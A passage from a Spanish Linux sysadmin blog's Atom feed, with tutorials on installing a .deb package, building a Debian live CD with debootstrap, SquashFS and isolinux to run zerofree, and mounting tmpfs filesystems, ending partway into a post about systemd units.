&lt;p&gt;Efectivamente, no lo está; ahora se trata de invocar &lt;strong&gt;dpkg&lt;/strong&gt; para instalar nuestro paquete.&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;root@packager:~# dpkg -i welcome_1.0-1_all.deb 
Seleccionando el paquete welcome previamente no seleccionado.
&lt;span class="o"&gt;(&lt;/span&gt;Leyendo la base de datos ... &lt;span class="m"&gt;9984&lt;/span&gt; ficheros o directorios instalados actualmente.&lt;span class="o"&gt;)&lt;/span&gt;
Preparando para desempaquetar welcome_1.0-1_all.deb ...
Desempaquetando welcome &lt;span class="o"&gt;(&lt;/span&gt;&lt;span class="m"&gt;1&lt;/span&gt;.0-1&lt;span class="o"&gt;)&lt;/span&gt; ...
Configurando welcome &lt;span class="o"&gt;(&lt;/span&gt;&lt;span class="m"&gt;1&lt;/span&gt;.0-1&lt;span class="o"&gt;)&lt;/span&gt; ...
root@packager:~# 
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;Y finalmente, verificamos que tenemos nuestro &lt;em&gt;script&lt;/em&gt; en &lt;em&gt;/usr/bin/&lt;/em&gt; como esperábamos:&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;root@packager:~# which welcome
/usr/bin/welcome
root@packager:~# welcome
Hello world!
root@packager:~# 
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;Y con esto tenemos nuestro paquete que podemos poner a buen recaudo.&lt;/p&gt;</content><category term="linux"></category><category term="debian"></category><category term="ubuntu"></category><category term="paquete"></category><category term=".deb"></category></entry><entry><title>Creación de un livecd con Debian</title><link href="https://www.linuxsysadmin.ml/2015/12/creacion-de-un-livecd-con-debian.html" rel="alternate"></link><published>2015-12-02T12:30:00+01:00</published><updated>2015-12-02T12:30:00+01:00</updated><author><name>Gerard</name></author><id>tag:www.linuxsysadmin.ml,2015-12-02:/2015/12/creacion-de-un-livecd-con-debian.html</id><summary type="html">&lt;p&gt;Tras ver como las actualizaciones de mis máquinas virtuales &lt;em&gt;VirtualBox&lt;/em&gt; expandían mis discos &lt;em&gt;.vdi&lt;/em&gt; sin control, quise pasar la herramienta &lt;em&gt;zerofree&lt;/em&gt; y un compactado con la herramienta oficial &lt;em&gt;VBoxManage&lt;/em&gt;. No quería instalar &lt;em&gt;zerofree&lt;/em&gt; de forma permanente y no pude encontrar un &lt;em&gt;livecd&lt;/em&gt; que lo tuviera, así que decidí crear uno …&lt;/p&gt;</summary><content type="html">&lt;p&gt;Tras ver como las actualizaciones de mis máquinas virtuales &lt;em&gt;VirtualBox&lt;/em&gt; expandían mis discos &lt;em&gt;.vdi&lt;/em&gt; sin control, quise pasar la herramienta &lt;em&gt;zerofree&lt;/em&gt; y un compactado con la herramienta oficial &lt;em&gt;VBoxManage&lt;/em&gt;. No quería instalar &lt;em&gt;zerofree&lt;/em&gt; de forma permanente y no pude encontrar un &lt;em&gt;livecd&lt;/em&gt; que lo tuviera, así que decidí crear uno.&lt;/p&gt;
&lt;p&gt;Para conseguirlo, se va a usar un sistema de ficheros creado con &lt;em&gt;debootstrap&lt;/em&gt; y compactado mediante &lt;em&gt;SquashFS&lt;/em&gt;; este sistema de ficheros se va a empaquetar en un &lt;em&gt;.iso&lt;/em&gt; junto con un &lt;em&gt;kernel&lt;/em&gt;, un &lt;em&gt;initrd&lt;/em&gt; y el bootloader &lt;em&gt;isolinux&lt;/em&gt;. La herramienta que hace eso es &lt;em&gt;genisoimage&lt;/em&gt;.&lt;/p&gt;
&lt;p&gt;Este tutorial se ejecutó en una distribución &lt;em&gt;Debian&lt;/em&gt;, pero no hay ningún problema en hacerlo en una &lt;em&gt;Ubuntu&lt;/em&gt; u otra distribución, siempre que sepamos como crear la imagen base para empaquetar.&lt;/p&gt;
&lt;h2&gt;Preparación del entorno&lt;/h2&gt;
&lt;p&gt;Todo el proceso va a ser ejecutado con el usuario &lt;em&gt;root&lt;/em&gt; por comodidad.&lt;/p&gt;
&lt;p&gt;Empezaremos por instalar todas las tecnologías que hemos mencionado:&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;root@desktop:~# apt-get install debootstrap isolinux squashfs-tools genisoimage
...
root@desktop:~# 
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;Creamos una carpeta de trabajo para contener todos los ficheros temporales y el producto final, por limpieza:&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;root@desktop:~# mkdir live_boot
root@desktop:~# &lt;span class="nb"&gt;cd&lt;/span&gt; live_boot
root@desktop:~/live_boot# 
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;Todos los comandos que se detallan a continuación se hacen desde dentro de esta carpeta.&lt;/p&gt;
&lt;h2&gt;Preparación del sistema de ficheros, el kernel y el initrd&lt;/h2&gt;
&lt;p&gt;El sistema de ficheros se hace a partir de una jaula estándar de una distribución normal. En este paso, las distribuciones que usan &lt;em&gt;debootstrap&lt;/em&gt; nos facilitan mucho las cosas (aunque esta es la operación mas larga de este tutorial):&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;root@desktop:~/live_boot# debootstrap --variant&lt;span class="o"&gt;=&lt;/span&gt;minbase jessie chroot
I: Retrieving Release 
I: Retrieving Release.gpg 
I: Checking Release signature
I: Valid Release signature &lt;span class="o"&gt;(&lt;/span&gt;key id 75DDC3C4A499F1A18CB5F3C8CBF8D6FD518E17E1&lt;span class="o"&gt;)&lt;/span&gt;
I: Retrieving Packages 
I: Validating Packages 
I: Resolving dependencies of required packages...
I: Resolving dependencies of base packages...
...
I: Base system installed successfully.
root@desktop:~/live_boot# 
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;Ahora se trata de preparar esta jaula con los paquetes que necesitemos y las configuraciones adecuadas. Vamos a montar los pseudo sistemas de ficheros &lt;em&gt;/proc&lt;/em&gt;, &lt;em&gt;/sys&lt;/em&gt;, &lt;em&gt;/dev&lt;/em&gt; y &lt;em&gt;/dev/pts&lt;/em&gt;, que posiblemente nos van a hacer falta cuando estemos dentro de la jaula.&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;root@desktop:~/live_boot# mount -o &lt;span class="nb"&gt;bind&lt;/span&gt; /proc/ chroot/proc/
root@desktop:~/live_boot# mount -o &lt;span class="nb"&gt;bind&lt;/span&gt; /sys/ chroot/sys/
root@desktop:~/live_boot# mount -o &lt;span class="nb"&gt;bind&lt;/span&gt; /dev/ chroot/dev/
root@desktop:~/live_boot# mount -o &lt;span class="nb"&gt;bind&lt;/span&gt; /dev/pts/ chroot/dev/pts/
root@desktop:~/live_boot# 
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;Entramos en la jaula:&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;root@desktop:~/live_boot# chroot chroot
root@desktop:/# 
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;&lt;strong&gt;CUIDADO&lt;/strong&gt;: A partir de ahora, y hasta nuevo aviso, todos los comandos se hacen &lt;strong&gt;dentro&lt;/strong&gt; de la jaula.&lt;/p&gt;
&lt;p&gt;Antes de nada, vamos a asignar una password al usuario &lt;em&gt;root&lt;/em&gt;, porque sino, no vamos a poder entrar en el &lt;em&gt;livecd&lt;/em&gt;.&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;root@desktop:/# passwd    
Enter new UNIX password: 
Retype new UNIX password: 
passwd: password updated successfully
root@desktop:/# 
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;Asignamos el nombre de máquina que mostrará el &lt;em&gt;livecd&lt;/em&gt; una vez haya hecho el &lt;em&gt;boot&lt;/em&gt;:&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;root@desktop:/# &lt;span class="nb"&gt;echo&lt;/span&gt; &lt;span class="s2"&gt;&amp;quot;zerofree&amp;quot;&lt;/span&gt; &amp;gt; /etc/hostname
root@desktop:/# 
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;Para que el &lt;em&gt;livecd&lt;/em&gt; pueda hacer &lt;em&gt;boot&lt;/em&gt;, vamos a necesitar el paquete &lt;strong&gt;live-boot&lt;/strong&gt; y un &lt;em&gt;kernel&lt;/em&gt; adecuado a la máquina que va a usar el &lt;em&gt;livecd&lt;/em&gt;. El paquete del &lt;em&gt;kernel&lt;/em&gt; ya nos va a dotar de un &lt;em&gt;initrd&lt;/em&gt; que también vamos a necesitar para el &lt;em&gt;livecd&lt;/em&gt;. Este paso también tarda un poco.&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;root@desktop:/# apt-get install linux-image-486 live-boot
Reading package lists... Done
Building dependency tree... Done
...
Setting up linux-image-3.16.0-4-586 &lt;span class="o"&gt;(&lt;/span&gt;&lt;span class="m"&gt;3&lt;/span&gt;.16.7-ckt11-1+deb8u3&lt;span class="o"&gt;)&lt;/span&gt; ...
...  
/etc/kernel/postinst.d/initramfs-tools:
update-initramfs: Generating /boot/initrd.img-3.16.0-4-586
...
root@desktop:/# 
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;Ahora vamos a instalar los paquetes que queramos en el &lt;em&gt;livecd&lt;/em&gt;; yo voy a poner &lt;em&gt;zerofree&lt;/em&gt; que es la herramienta que motivó este &lt;em&gt;livecd&lt;/em&gt;.&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;root@desktop:/# apt-get install zerofree
...
Unpacking zerofree &lt;span class="o"&gt;(&lt;/span&gt;&lt;span class="m"&gt;1&lt;/span&gt;.0.3-1&lt;span class="o"&gt;)&lt;/span&gt; ...
Setting up zerofree &lt;span class="o"&gt;(&lt;/span&gt;&lt;span class="m"&gt;1&lt;/span&gt;.0.3-1&lt;span class="o"&gt;)&lt;/span&gt; ...
root@desktop:/# 
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;&lt;strong&gt;OPCIONAL&lt;/strong&gt;: Para reducir el tamaño final, voy a limpiar todos los archivos temporales que usa &lt;em&gt;apt&lt;/em&gt;, tanto los archivos &lt;em&gt;.deb&lt;/em&gt; en &lt;em&gt;/var/cache/apt&lt;/em&gt;, como las listas de paquetes disponibles en &lt;em&gt;/var/lib/apt&lt;/em&gt;.&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;root@desktop:/# cat /dev/null &amp;gt; /etc/apt/sources.list
root@desktop:/# apt-get update
Reading package lists... Done
root@desktop:/# apt-get clean 
root@desktop:/# 
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;Y finalmente salimos de la jaula:&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;root@desktop:/# &lt;span class="nb"&gt;exit&lt;/span&gt;
&lt;span class="nb"&gt;exit&lt;/span&gt;
root@desktop:~/live_boot# 
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;&lt;strong&gt;CUIDADO&lt;/strong&gt;: A partir de ahora, todos los comandos se hacen &lt;strong&gt;fuera&lt;/strong&gt; de la jaula.&lt;/p&gt;
&lt;p&gt;Vamos a desmontar los pseudo sistemas de ficheros que ya no son necesarios, y que van a molestar cuando compactemos la jaula. Como apunte, la jaula había levantado un proceso &lt;em&gt;/usr/sbin/uuidd&lt;/em&gt; que evitaba desmontar &lt;em&gt;chroot/dev&lt;/em&gt;, por lo que tuve que finalizar el proceso con un &lt;em&gt;kill&lt;/em&gt;.&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;root@desktop:~/live_boot# umount chroot/dev/pts/
root@desktop:~/live_boot# umount chroot/dev/
root@desktop:~/live_boot# umount chroot/sys/
root@desktop:~/live_boot# umount chroot/proc/
root@desktop:~/live_boot# 
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;&lt;strong&gt;OPCIONAL&lt;/strong&gt;: Sabiendo que mis máquinas virtuales son clones y el comando que va a correr siempre el comando &lt;em&gt;zerofree&lt;/em&gt; contra el disco &lt;em&gt;/dev/sda1&lt;/em&gt;, se puede poner los comandos en el &lt;em&gt;.bash_history&lt;/em&gt; de &lt;em&gt;root&lt;/em&gt; para poderlos recuperar mediante el uso de flechas.&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;root@desktop:~/live_boot# cat chroot/root/.bash_history 
zerofree /dev/sda1
poweroff
root@desktop:~/live_boot# 
&lt;/pre&gt;&lt;/div&gt;


&lt;h2&gt;Empaquetando la imagen&lt;/h2&gt;
&lt;p&gt;Vamos a crear una carpeta contenedora, que va a servir como raíz del &lt;em&gt;livecd&lt;/em&gt;. Dentro le vamos a poner una carpeta &lt;em&gt;live&lt;/em&gt; (para el sistema de ficheros, el &lt;em&gt;kernel&lt;/em&gt; y el &lt;em&gt;initrd&lt;/em&gt;) y una carpeta &lt;em&gt;isolinux&lt;/em&gt; (para todo lo referente al &lt;em&gt;bootloader&lt;/em&gt;).&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;root@desktop:~/live_boot# mkdir -p image/&lt;span class="o"&gt;{&lt;/span&gt;live,isolinux&lt;span class="o"&gt;}&lt;/span&gt;
root@desktop:~/live_boot# 
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;Vamos a poner el sistema de ficheros en formato &lt;em&gt;SquashFS&lt;/em&gt;. Como apunte, el &lt;em&gt;kernel&lt;/em&gt; y el &lt;em&gt;initrd&lt;/em&gt; (ambos en la carpeta &lt;em&gt;/boot&lt;/em&gt;) se excluyen porque el &lt;em&gt;bootloader&lt;/em&gt; es incapaz de leerlos de allí; así que los copiamos a la misma carpeta.&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;root@desktop:~/live_boot# mksquashfs chroot image/live/filesystem.squashfs -e boot
Parallel mksquashfs: Using &lt;span class="m"&gt;1&lt;/span&gt; processor
Creating &lt;span class="m"&gt;4&lt;/span&gt;.0 filesystem on image/live/filesystem.squashfs, block size &lt;span class="m"&gt;131072&lt;/span&gt;.
...  
root@desktop:~/live_boot# cp chroot/boot/vmlinuz-3.16.0-4-586 image/live/vmlinuz
root@desktop:~/live_boot# cp chroot/boot/initrd.img-3.16.0-4-586 image/live/initrd
root@desktop:~/live_boot# 
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;Ahora vamos con el &lt;em&gt;bootloader&lt;/em&gt;. Lo primero es poner una configuración para saber qué menú nos va a mostrar:&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;root@desktop:~/live_boot# cat image/isolinux/isolinux.cfg 
UI menu.c32

prompt &lt;span class="m"&gt;0&lt;/span&gt;
menu title Debian Zerofree

timeout &lt;span class="m"&gt;50&lt;/span&gt;

label Debian Live &lt;span class="m"&gt;3&lt;/span&gt;.16.0-4-586
menu label ^Debian Live &lt;span class="m"&gt;3&lt;/span&gt;.16.0-4-586
menu default
kernel /live/vmlinuz
append &lt;span class="nv"&gt;initrd&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;/live/initrd &lt;span class="nv"&gt;boot&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;live
root@desktop:~/live_boot# 
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;Copiamos la imagen del &lt;em&gt;bootloader&lt;/em&gt; &lt;strong&gt;isolinux&lt;/strong&gt; y los módulos que se necesitan, tanto porque nuestra configuración los usa o porque se usan desde otros módulos.&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;root@desktop:~/live_boot# cp /usr/lib/ISOLINUX/isolinux.bin image/isolinux/
root@desktop:~/live_boot# cp /usr/lib/syslinux/modules/bios/ldlinux.c32 image/isolinux/
root@desktop:~/live_boot# cp /usr/lib/syslinux/modules/bios/menu.c32 image/isolinux/
root@desktop:~/live_boot# cp /usr/lib/syslinux/modules/bios/libutil.c32 image/isolinux/
root@desktop:~/live_boot# 
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;Finalmente empaquetamos la imagen &lt;em&gt;.iso&lt;/em&gt;. Para ello usaremos la herramienta &lt;em&gt;genisoimage&lt;/em&gt; en la carpeta raíz de lo que sería el &lt;em&gt;livecd&lt;/em&gt;.&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;root@desktop:~/live_boot# &lt;span class="nb"&gt;cd&lt;/span&gt; image/
root@desktop:~/live_boot/image# genisoimage -rational-rock -volid &lt;span class="s2"&gt;&amp;quot;Debian Zerofree&amp;quot;&lt;/span&gt; -cache-inodes -joliet -full-iso9660-filenames -b isolinux/isolinux.bin -c isolinux/boot.cat -no-emul-boot -boot-load-size &lt;span class="m"&gt;4&lt;/span&gt; -boot-info-table -output ../debian-zerofree.iso .
I: -input-charset not specified, using utf-8 &lt;span class="o"&gt;(&lt;/span&gt;detected in locale settings&lt;span class="o"&gt;)&lt;/span&gt;
Size of boot image is &lt;span class="m"&gt;4&lt;/span&gt; sectors -&amp;gt; No emulation
  &lt;span class="m"&gt;9&lt;/span&gt;.24% &lt;span class="k"&gt;done&lt;/span&gt;, estimate finish Wed Dec  &lt;span class="m"&gt;2&lt;/span&gt; &lt;span class="m"&gt;12&lt;/span&gt;:06:43 &lt;span class="m"&gt;2015&lt;/span&gt;
 &lt;span class="m"&gt;18&lt;/span&gt;.48% &lt;span class="k"&gt;done&lt;/span&gt;, estimate finish Wed Dec  &lt;span class="m"&gt;2&lt;/span&gt; &lt;span class="m"&gt;12&lt;/span&gt;:06:38 &lt;span class="m"&gt;2015&lt;/span&gt;
 &lt;span class="m"&gt;27&lt;/span&gt;.69% &lt;span class="k"&gt;done&lt;/span&gt;, estimate finish Wed Dec  &lt;span class="m"&gt;2&lt;/span&gt; &lt;span class="m"&gt;12&lt;/span&gt;:06:36 &lt;span class="m"&gt;2015&lt;/span&gt;
 &lt;span class="m"&gt;36&lt;/span&gt;.94% &lt;span class="k"&gt;done&lt;/span&gt;, estimate finish Wed Dec  &lt;span class="m"&gt;2&lt;/span&gt; &lt;span class="m"&gt;12&lt;/span&gt;:06:38 &lt;span class="m"&gt;2015&lt;/span&gt;
 &lt;span class="m"&gt;46&lt;/span&gt;.15% &lt;span class="k"&gt;done&lt;/span&gt;, estimate finish Wed Dec  &lt;span class="m"&gt;2&lt;/span&gt; &lt;span class="m"&gt;12&lt;/span&gt;:06:37 &lt;span class="m"&gt;2015&lt;/span&gt;
 &lt;span class="m"&gt;55&lt;/span&gt;.40% &lt;span class="k"&gt;done&lt;/span&gt;, estimate finish Wed Dec  &lt;span class="m"&gt;2&lt;/span&gt; &lt;span class="m"&gt;12&lt;/span&gt;:06:36 &lt;span class="m"&gt;2015&lt;/span&gt;
 &lt;span class="m"&gt;64&lt;/span&gt;.61% &lt;span class="k"&gt;done&lt;/span&gt;, estimate finish Wed Dec  &lt;span class="m"&gt;2&lt;/span&gt; &lt;span class="m"&gt;12&lt;/span&gt;:06:37 &lt;span class="m"&gt;2015&lt;/span&gt;
 &lt;span class="m"&gt;73&lt;/span&gt;.85% &lt;span class="k"&gt;done&lt;/span&gt;, estimate finish Wed Dec  &lt;span class="m"&gt;2&lt;/span&gt; &lt;span class="m"&gt;12&lt;/span&gt;:06:37 &lt;span class="m"&gt;2015&lt;/span&gt;
 &lt;span class="m"&gt;83&lt;/span&gt;.07% &lt;span class="k"&gt;done&lt;/span&gt;, estimate finish Wed Dec  &lt;span class="m"&gt;2&lt;/span&gt; &lt;span class="m"&gt;12&lt;/span&gt;:06:37 &lt;span class="m"&gt;2015&lt;/span&gt;
 &lt;span class="m"&gt;92&lt;/span&gt;.30% &lt;span class="k"&gt;done&lt;/span&gt;, estimate finish Wed Dec  &lt;span class="m"&gt;2&lt;/span&gt; &lt;span class="m"&gt;12&lt;/span&gt;:06:38 &lt;span class="m"&gt;2015&lt;/span&gt;
Total translation table size: &lt;span class="m"&gt;2048&lt;/span&gt;
Total rockridge attributes bytes: &lt;span class="m"&gt;1335&lt;/span&gt;
Total directory bytes: &lt;span class="m"&gt;4570&lt;/span&gt;
Path table size&lt;span class="o"&gt;(&lt;/span&gt;bytes&lt;span class="o"&gt;)&lt;/span&gt;: &lt;span class="m"&gt;38&lt;/span&gt;
Max brk space used 1a000
&lt;span class="m"&gt;54178&lt;/span&gt; extents written &lt;span class="o"&gt;(&lt;/span&gt;&lt;span class="m"&gt;105&lt;/span&gt; MB&lt;span class="o"&gt;)&lt;/span&gt;
root@desktop:~/live_boot/image# &lt;span class="nb"&gt;cd&lt;/span&gt; ..
root@desktop:~/live_boot# 
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;Y nuestra imagen &lt;em&gt;.iso&lt;/em&gt; queda en la carpeta de trabajo, junto a la jaula y a la estructura del &lt;em&gt;livecd&lt;/em&gt;. Solo necesitamos la imagen &lt;em&gt;.iso&lt;/em&gt;, pero podemos dejar los ficheros intermedios hasta que estemos satisfechos con la imagen; es mas fácil modificar la jaula, el empaquetado &lt;em&gt;filesystem.squashfs&lt;/em&gt; y la imagen &lt;em&gt;.iso&lt;/em&gt; que volver a hacer un &lt;em&gt;debootstrap&lt;/em&gt; entero...&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;root@desktop:~/live_boot# ls -lh
total 106M
drwxr-xr-x &lt;span class="m"&gt;20&lt;/span&gt; root root &lt;span class="m"&gt;4&lt;/span&gt;,0K dic  &lt;span class="m"&gt;2&lt;/span&gt; &lt;span class="m"&gt;11&lt;/span&gt;:30 chroot
-rw-r--r--  &lt;span class="m"&gt;1&lt;/span&gt; root root 106M dic  &lt;span class="m"&gt;2&lt;/span&gt; &lt;span class="m"&gt;12&lt;/span&gt;:06 debian-zerofree.iso
drwxr-xr-x  &lt;span class="m"&gt;4&lt;/span&gt; root root &lt;span class="m"&gt;4&lt;/span&gt;,0K dic  &lt;span class="m"&gt;2&lt;/span&gt; &lt;span class="m"&gt;11&lt;/span&gt;:53 image
root@desktop:~/live_boot# 
&lt;/pre&gt;&lt;/div&gt;


&lt;h2&gt;Conclusión&lt;/h2&gt;
&lt;p&gt;Copiando esta imagen &lt;em&gt;.iso&lt;/em&gt; a mi máquina con &lt;em&gt;VirtualBox&lt;/em&gt; y montándola antes de hacer el &lt;em&gt;boot&lt;/em&gt; de cada máquina, puedo usar la herramienta &lt;em&gt;zerofree&lt;/em&gt; libremente, sin instalarla en las máquinas virtuales. Tras ello, el compactado de los ficheros &lt;em&gt;.vdi&lt;/em&gt; libera los megabytes a cientos.&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;gerard@virtualbox:~/VirtualBox VMs$ VBoxManage modifyvdi Debian/Debian.vdi --compact
...
gerard@virtualbox:~/VirtualBox VMs$ 
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;En este caso concreto, la máquina &lt;strong&gt;Debian&lt;/strong&gt; (&lt;em&gt;netinstall&lt;/em&gt;) volvió a ocupar 700 mb, que es mucho mas interesante teniendo en cuenta que es la imagen que suelo clonar para hacer otras máquinas virtuales.&lt;/p&gt;</content><category term="linux"></category><category term="debian"></category><category term="jessie"></category><category term="zerofree"></category><category term="debootstrap"></category><category term="squashfs"></category><category term="genisoimage"></category><category term="isolinux"></category><category term="iso"></category><category term="livecd"></category></entry><entry><title>Creando sistemas de ficheros temporales con tmpfs</title><link href="https://www.linuxsysadmin.ml/2015/11/creando-sistemas-de-ficheros-temporales-con-tmpfs.html" rel="alternate"></link><published>2015-11-16T23:15:00+01:00</published><updated>2015-11-16T23:15:00+01:00</updated><author><name>Gerard</name></author><id>tag:www.linuxsysadmin.ml,2015-11-16:/2015/11/creando-sistemas-de-ficheros-temporales-con-tmpfs.html</id><summary type="html">&lt;p&gt;A veces nos podemos encontrar con un sistema de ficheros lleno que no nos permite completar alguna acción por falta de espacio en disco. En un caso así, existe la posibilidad de sacar un sistema de ficheros completo de memoria, de una forma temporal, usando el sistema de ficheros &lt;em&gt;tmpfs …&lt;/em&gt;&lt;/p&gt;</summary><content type="html">&lt;p&gt;A veces nos podemos encontrar con un sistema de ficheros lleno que no nos permite completar alguna acción por falta de espacio en disco. En un caso así, existe la posibilidad de sacar un sistema de ficheros completo de memoria, de una forma temporal, usando el sistema de ficheros &lt;em&gt;tmpfs&lt;/em&gt;. Otra opción es la de tener un sistema de ficheros temporal, en donde podamos dejar ficheros cuya persistencia no sea necesaria entre reinicios.&lt;/p&gt;
&lt;p&gt;El primer paso es tener un &lt;em&gt;punto de montaje&lt;/em&gt;, que sea la carpeta en la que se va a montar el nuevo sistema de fichero. Por ejemplo podemos usar el punto de montaje &lt;em&gt;/mnt/auxiliar&lt;/em&gt;; empezaremos creándolo.&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;root@server:~# mkdir /mnt/auxiliar
root@server:~# 
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;Observemos como la carpeta creada se construye sobre el mismo dispositivo que la partición raíz:&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;root@server:~# df -h /mnt/auxiliar/
S.ficheros     Tamaño Usados  Disp Uso% Montado en
/dev/sda1        &lt;span class="m"&gt;2&lt;/span&gt;,0G   640M  &lt;span class="m"&gt;1&lt;/span&gt;,2G  &lt;span class="m"&gt;35&lt;/span&gt;% /
root@server:~# 
&lt;/pre&gt;&lt;/div&gt;


&lt;h2&gt;Creando el sistema de ficheros de forma temporal&lt;/h2&gt;
&lt;p&gt;Como prueba de concepto, podemos crear este sistema de ficheros de forma temporal. En caso de no salir bien, los efectos no serían permanentes.&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;root@server:~# mount -o &lt;span class="nv"&gt;size&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;100M -t tmpfs auxiliar /mnt/auxiliar/
root@server:~# 
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;Podemos ver como la carpeta pertenece ahora a un sistema de ficheros nuevo:&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;root@server:~# df -h /mnt/auxiliar/
S.ficheros     Tamaño Usados  Disp Uso% Montado en
auxiliar            100M      &lt;span class="m"&gt;0&lt;/span&gt;  100M   &lt;span class="m"&gt;0&lt;/span&gt;% /mnt/auxiliar
root@server:~# 
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;Cuando nos cansemos del nuevo sistema de ficheros, haya cumplido con su utilidad y ya no necesitemos su contenido, la podemos desmontar; vamos a perder todos los ficheros dentro del sistema de ficheros temporal.&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;root@server:~# umount /mnt/auxiliar/
root@server:~# 
&lt;/pre&gt;&lt;/div&gt;


&lt;h2&gt;Haciendo el cambio permanente&lt;/h2&gt;
&lt;p&gt;Si nos interesa que este sistema de fichero se &lt;em&gt;monte&lt;/em&gt; y se &lt;em&gt;desmonte&lt;/em&gt; cada vez que la máquina se inicie y se apague, basta con usar el mecanismo estándar de todo sistema de ficheros &lt;em&gt;Linux&lt;/em&gt;: el fichero &lt;em&gt;/etc/fstab&lt;/em&gt;. Basta con añadir una línea nueva con las especificaciones de este punto de montaje, por ejemplo en el final del mismo.&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;root@server:~# tail -1 /etc/fstab 
auxiliar /mnt/auxiliar tmpfs &lt;span class="nv"&gt;size&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;100M &lt;span class="m"&gt;0&lt;/span&gt; &lt;span class="m"&gt;0&lt;/span&gt;
root@server:~# 
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;Con este cambio es suficiente para las sesiones venideras. En caso de querer disponer inmediatamente del sistema de ficheros podemos solicitar el montaje con un comando &lt;em&gt;mount&lt;/em&gt; normal, comando que va a usar las especificaciones del fichero &lt;em&gt;/etc/fstab&lt;/em&gt;.&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;root@server:~# mount /mnt/auxiliar
root@server:~# 
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;Y con esto queda completado nuestro objetivo.&lt;/p&gt;</content><category term="linux"></category><category term="tmpfs"></category></entry><entry><title>Escribiendo units en systemd</title><link href="https://www.linuxsysadmin.ml/2015/11/escribiendo-units-en-systemd.html" rel="alternate"></link><published>2015-11-09T22:30:00+01:00</published><updated>2015-11-09T22:30:00+01:00</updated><author><name>Gerard</name></author><id>tag:www.linuxsysadmin.ml,2015-11-09:/2015/11/escribiendo-units-en-systemd.html</id><summary type="html">&lt;p&gt;Cuando se anunció &lt;em&gt;systemd&lt;/em&gt; me llamó la atención que además de las funciones estándares de otros sistemas de &lt;em&gt;init&lt;/em&gt; (por ejemplo &lt;em&gt;sysvinit&lt;/em&gt;), también se ofrecían otras funcionalidades normalmente delegadas a otros procesos, como por ejemplo, la posibilidad de reiniciar procesos automáticamente o 